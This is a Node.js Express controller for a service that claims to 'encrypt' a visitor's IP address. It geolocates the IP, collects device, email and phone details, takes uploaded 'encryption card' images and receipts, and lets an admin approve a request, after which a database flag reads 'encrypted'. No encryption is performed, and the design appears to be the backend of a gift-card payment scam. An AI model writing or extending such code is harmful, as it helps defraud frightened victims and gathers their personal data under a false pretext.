// controllers/ipController.js
const IP = require("../models/ip");
const axios = require("axios");
const { cloudinary } = require("../config/cloudinary");
const emailService = require("../services/email");

/**
 * Check an IP's encryption status from database
 * If IP doesn't exist, save it with default encryption status as false
 */
const checkEncryption = async (req, res) => {
  try {
    const { ip } = req.body;

    if (!ip) {
      return res
        .status(400)
        .json({ success: false, message: "IP address is required" });
    }

    // Check if the IP already exists in our database
    let ipRecord = await IP.findOne({ ip });

    if (ipRecord) {
      // Update the access count and last accessed time
      ipRecord.accessCount += 1;
      ipRecord.lastAccessed = Date.now();
      await ipRecord.save();

      return res.status(200).json({
        success: true,
        encrypted: ipRecord.isEncrypted,
        encryptionStatus: ipRecord.encryptionStatus,
        newRecord: false,
      });
    }

    // IP is not in our database, fetch basic info and save with default encryption = false
    const ipInfo = await fetchIpInfo(ip);

    // Create a new record in the database
    ipRecord = new IP({
      ip,
      isEncrypted: false, // Default to false for new IPs
      city: ipInfo?.city,
      region: ipInfo?.region,
      country: ipInfo?.country,
      latitude: ipInfo?.latitude,
      longitude: ipInfo?.longitude,
      isp: ipInfo?.connection?.isp,
    });

    await ipRecord.save();

    return res.status(200).json({
      success: true,
      encrypted: false, // New IPs are assumed not encrypted
      encryptionStatus: "unapproved",
      newRecord: true,
    });
  } catch (error) {
    console.error("Error in checkEncryption controller:", error);
    return res.status(500).json({
      success: false,
      message: "Server error checking encryption status",
      error: error.message,
    });
  }
};

/**
 * Process encryption request with uploaded images
 * Images are already uploaded via multer middleware before reaching this controller
 */
const requestEncryption = async (req, res) => {
  try {
    const { ip, deviceModel, osVersion, email, phoneNumber } = req.body;

    if (!ip) {
      return res
        .status(400)
        .json({ success: false, message: "IP address is required" });
    }

    // Get files from multer middleware
    const cardImages = req.files.images || [];
    const receiptImages = req.files.receipts || [];

    if (cardImages.length === 0) {
      return res.status(400).json({
        success: false,
        message: "Encryption card images are required",
      });
    }

    // Find or create IP record
    let ipRecord = await IP.findOne({ ip });

    if (!ipRecord) {
      // Fetch IP info if record doesn't exist
      const ipInfo = await fetchIpInfo(ip);

      ipRecord = new IP({
        ip,
        isEncrypted: false,
        city: ipInfo?.city,
        region: ipInfo?.region,
        country: ipInfo?.country,
        latitude: ipInfo?.latitude,
        longitude: ipInfo?.longitude,
        isp: ipInfo?.connection?.isp,
      });
    }

    // Add device and contact info
    ipRecord.deviceModel = deviceModel;
    ipRecord.osVersion = osVersion;
    ipRecord.email = email;
    ipRecord.phoneNumber = phoneNumber;

    // Process and add encryption card images
    const uploadedCardImages = cardImages.map((file) => ({
      url: file.path, // Cloudinary URL
      publicId: file.filename, // Cloudinary public ID
      uploadDate: new Date(),
    }));

    // Process and add receipt images if any
    const uploadedReceiptImages = receiptImages.map((file) => ({
      url: file.path,
      publicId: file.filename,
      uploadDate: new Date(),
    }));

    ipRecord.encryptionCardImages = [
      ...(ipRecord.encryptionCardImages || []),
      ...uploadedCardImages,
    ];

    ipRecord.receiptImages = [
      ...(ipRecord.receiptImages || []),
      ...uploadedReceiptImages,
    ];

    ipRecord.encryptionRequestDate = new Date();
    ipRecord.encryptionStatus = "pending";

    await ipRecord.save();

    // Send email notification to admin
    const ipInfo = {
      ip: ipRecord.ip,
      city: ipRecord.city,
      region: ipRecord.region,
      country: ipRecord.country,
      isp: ipRecord.isp,
      deviceModel: ipRecord.deviceModel,
      osVersion: ipRecord.osVersion,
      email: ipRecord.email,
      phoneNumber: ipRecord.phoneNumber,
    };

    // Combine all images for email notification
    const allImages = [
      ...uploadedCardImages.map((img) => ({ ...img, type: "Encryption Card" })),
      ...uploadedReceiptImages.map((img) => ({ ...img, type: "Receipt" })),
    ];

    // Send notification asynchronously (don't wait for it to complete)
    emailService
      .sendEncryptionRequestNotification(ipInfo, allImages)
      .catch((err) => console.error("Failed to send notification email:", err));

    return res.status(200).json({
      success: true,
      message: "Encryption request submitted successfully",
      encryptionStatus: "pending",
      cardImages: uploadedCardImages,
      receiptImages: uploadedReceiptImages,
    });
  } catch (error) {
    console.error("Error in requestEncryption controller:", error);
    return res.status(500).json({
      success: false,
      message: "Server error processing encryption request",
      error: error.message,
    });
  }
};

/**
 * Admin endpoint to approve or reject encryption requests
 */
const updateEncryptionStatus = async (req, res) => {
  try {
    const { ip, status, notes } = req.body;

    if (!ip) {
      return res
        .status(400)
        .json({ success: false, message: "IP address is required" });
    }

    if (!["approved", "rejected"].includes(status)) {
      return res.status(400).json({
        success: false,
        message: "Status must be approved or rejected",
      });
    }

    const ipRecord = await IP.findOne({ ip });

    if (!ipRecord) {
      return res
        .status(404)
        .json({ success: false, message: "IP record not found" });
    }

    ipRecord.encryptionStatus = status;
    ipRecord.isEncrypted = status === "approved"; // Update encryption flag based on approval
    if (notes) ipRecord.encryptionNotes = notes;

    await ipRecord.save();

    return res.status(200).json({
      success: true,
      message: `Encryption status for ${ip} updated to ${status}`,
      encrypted: ipRecord.isEncrypted,
    });
  } catch (error) {
    console.error("Error updating encryption status:", error);
    return res.status(500).json({
      success: false,
      message: "Server error updating encryption status",
      error: error.message,
    });
  }
};

/**
 * Delete an image from Cloudinary and the database
 */
const deleteEncryptionImage = async (req, res) => {
  try {
    const { ip, imageId, type } = req.params;

    const ipRecord = await IP.findOne({ ip });

    if (!ipRecord) {
      return res
        .status(404)
        .json({ success: false, message: "IP record not found" });
    }

    // Determine which image array to use based on type
    const imageArray =
      type === "receipt" ? "receiptImages" : "encryptionCardImages";

    // Find the image in the images array
    const imageIndex = ipRecord[imageArray].findIndex(
      (img) => img._id.toString() === imageId
    );

    if (imageIndex === -1) {
      return res
        .status(404)
        .json({ success: false, message: "Image not found" });
    }

    const image = ipRecord[imageArray][imageIndex];

    // Delete from Cloudinary
    if (image.publicId) {
      await cloudinary.uploader.destroy(image.publicId);
    }

    // Remove from the database array
    ipRecord[imageArray].splice(imageIndex, 1);
    await ipRecord.save();

    return res.status(200).json({
      success: true,
      message: "Image deleted successfully",
    });
  } catch (error) {
    console.error("Error deleting image:", error);
    return res.status(500).json({
      success: false,
      message: "Server error deleting image",
      error: error.message,
    });
  }
};

/**
 * Fetch additional information about an IP
 */
const fetchIpInfo = async (ip) => {
  try {
    const response = await axios.get(`https://ipwho.is/${ip}`);
    const data = response.data;

    if (data.success === false) {
      return null;
    }

    return {
      city: data.city,
      region: data.region,
      country: data.country,
      latitude: data.latitude,
      longitude: data.longitude,
      connection: data.connection,
    };
  } catch (error) {
    console.error("Error fetching IP info:", error);
    return null;
  }
};

/**
 * Get stats about stored IPs
 */
const getStats = async (req, res) => {
  try {
    const totalIPs = await IP.countDocuments();
    const encryptedIPs = await IP.countDocuments({ isEncrypted: true });
    const pendingRequests = await IP.countDocuments({
      encryptionStatus: "pending",
    });

    const recentIPs = await IP.find()
      .sort({ lastAccessed: -1 })
      .limit(10)
      .select("ip isEncrypted city country lastAccessed encryptionStatus -_id");

    res.status(200).json({
      success: true,
      stats: {
        total: totalIPs,
        encrypted: encryptedIPs,
        pending: pendingRequests,
        encryptedPercentage:
          totalIPs > 0 ? ((encryptedIPs / totalIPs) * 100).toFixed(2) : 0,
        recent: recentIPs,
      },
    });
  } catch (error) {
    console.error("Error getting stats:", error);
    res.status(500).json({
      success: false,
      message: "Server error getting stats",
      error: error.message,
    });
  }
};

/**
 * Get pending encryption requests
 */
const getPendingRequests = async (req, res) => {
  try {
    const pendingRequests = await IP.find({ encryptionStatus: "pending" })
      .sort({ encryptionRequestDate: -1 })
      .select(
        "ip deviceModel email phoneNumber city country encryptionRequestDate encryptionCardImages receiptImages"
      );

    res.status(200).json({
      success: true,
      count: pendingRequests.length,
      requests: pendingRequests,
    });
  } catch (error) {
    console.error("Error getting pending requests:", error);
    res.status(500).json({
      success: false,
      message: "Server error getting pending requests",
      error: error.message,
    });
  }
};

module.exports = {
  checkEncryption,
  requestEncryption,
  updateEncryptionStatus,
  deleteEncryptionImage,
  getStats,
  getPendingRequests,
};
